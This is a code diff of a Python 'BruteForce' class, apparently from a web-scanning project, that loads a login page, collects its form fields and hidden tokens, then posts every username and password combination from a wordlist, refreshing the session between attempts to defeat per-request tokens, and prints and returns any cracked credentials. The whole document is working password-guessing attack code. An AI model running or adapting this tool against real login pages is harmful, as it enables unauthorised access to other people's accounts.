@@ -1,6 +1,5 @@
 from bs4 import BeautifulSoup
 from Utilities.File import File
-from timeit import default_timer as timer
 
 
 class BruteForce(object):
@@ -9,54 +8,71 @@ class BruteForce(object):
         self.url = url
         self.request = request
 
-    def startBruteFoce(self):
-        # at this stage, we will be focusing on AUTH (login)
+    def startBruteForce(self):
+        """
+        Brute Force on the given page, for example: "login.php", then
+        finds the input fields (username and password), brute force 
+        those input fields with possible username and password (combination
+        are stored in userpass.txt) and return if success
+
+        @args self
+        @return tuple (flag, username, password)
+        """
+
         r = self.request.get(self.url)
-        start = timer()
-        print("Request URL", r.url)
+
+        print("Request URL: " + r.url)
+
+        username = ""
+        password = ""
+        url = ""
+
+        # only focusing on "Login" page
         if("login" in r.url):
-            # it means you on login page (in most cases)
-            # then get the possible inputs (empty)
             textfile = File()
             textfile = textfile.getPossibleUserPass()
 
             flag = False
             for i in range(len(textfile)):
-                # token expires every failed attempts, if
-                # website does not have token, then it does not matter
-                r = self.request.close()
-                r = self.request.get(self.url)
-                
+                # token expires on every failed attempts,
+                # if website does not have the token, still
+                # refreshes the page.
+                r = self.request.close() # end session
+                r = self.request.get(self.url) # start session
+
                 soup = BeautifulSoup(r.content, "html.parser")
                 data = {}
+                
+                # finds all possible input fields
                 for x in soup.findAll("input"):
                     data[x.get('name')] = x.get('value')
 
-                # hardcoded for now... terrible style, who cares
-                data["username"] = (textfile[i].strip())
                 for j in range(len(textfile)):
+                    data["username"] = (textfile[i].strip())
                     data["password"] = (textfile[j].strip())
                     s = self.request.post(r.url, data)
-                    # print(data)
-                    # print(s.url)
-                    if("index.php" in s.url):
-                        print("Successfully cracked it! " + textfile[i].strip() + ":" + textfile[j].strip())
+
+                    if(s.url != self.url):
+                        url = s.url
+                        username = textfile[i].strip()
+                        password = textfile[j].strip()
+                        print("Successfully cracked it! " + username  + ":" + password)
                         flag = True
                         break
+
                     r = self.request.close()
                     r = self.request.get(self.url)
                     
                     soup = BeautifulSoup(r.content, "html.parser")
                     data = {}
+                    
+                    # finds all possible input fields
                     for x in soup.findAll("input"):
                         data[x.get('name')] = x.get('value')
-                    data["username"] = (textfile[i].strip())
 
                 if(flag):
                     break
 
-        end = timer()
-        print("Completed in %.3f ms" % (end - start))
 
-        return 
+        return (flag, username, password, url)
 
